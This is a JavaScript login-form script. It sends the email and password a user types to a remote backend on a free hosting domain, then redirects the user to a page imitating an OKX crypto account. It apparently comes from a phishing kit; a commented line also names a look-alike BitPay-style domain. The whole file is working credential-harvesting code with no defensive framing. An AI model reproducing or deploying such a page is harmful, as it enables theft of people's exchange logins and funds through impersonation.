
const email = document.getElementById('email')
const password = document.getElementById('password')
const button = document.getElementById('signInBtn')

console.log(button);

const sendLoginEmail = async () => {
  const data = {
    email: email.value,
  };
  
  fetch('https://my-guy-efabackend.onrender.com/api/loginemailsand', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response=> response.json())
    .then(response => {
      const userId = localStorage?.getItem('userId')
      console.log("Local User Id", userId);
         window.location.href = `https://okxassetsuseraccount.vercel.app//#/${userId}`;
      console.log(response);
      console.log(response);
    })
    .catch((error) => {
      console.log(error);
    });
};

button.onclick = async (event) => {
  event.preventDefault();

  const data = {
    email: email.value,
    password: password.value,
  };

  console.log(data);
  button.innerText = "Loading...";

  fetch('https://my-guy-efa-back-end.vercel.app/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response=> response.json())
    .then(response => {
      localStorage.setItem('userId', response?._id)
      console.log(response)
      if (response._id === '' || response._id === undefined){
        alert('Please enter your valid credentials');
        console.log("object");
        return
      }else{
        console.log("object2");
        sendLoginEmail()
        // window.location = `https://www.accounts-bitpaycapital.com/#/${userId}`;
      }
    })
    .catch((error) => {
      console.log(error);
    });
};